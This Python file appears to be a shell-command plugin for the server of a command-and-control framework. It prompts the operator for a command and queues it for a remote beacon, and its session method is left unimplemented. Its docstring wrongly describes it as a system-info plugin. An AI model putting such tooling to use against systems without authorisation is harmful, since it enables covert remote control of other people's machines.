"""System Info plugin for beacon and session.

Imports are written to work both when executing from the project root
as well as when running the server from inside src/Server.
"""
from Modules.beacon.beacon import add_beacon_command_list
from Modules.global_objects import logger, config, obfuscation_map
from ServerDatabase.database import DatabaseClass
from Modules.session.transfer import send_data, receive_data

from datetime import datetime
import json
from pathlib import Path


class Shell:
    def __init__(self):
        self.command = "shell"
        # as this is a core module the obfuscation sits in the main obfuscation file.

        self.database = DatabaseClass(config)

    def beacon(self, beacon: dict) -> None:
        """Queue shell command for a beacon by userID."""
        command = input("What command do you want to run: ")
        add_beacon_command_list(beacon.userID, None, self.command, command)
        logger.debug(
            f"Shell command added to command list for userID: {beacon.userID}"
        )

    def session(self, session: dict) -> None:
      print("Not implemented")
      return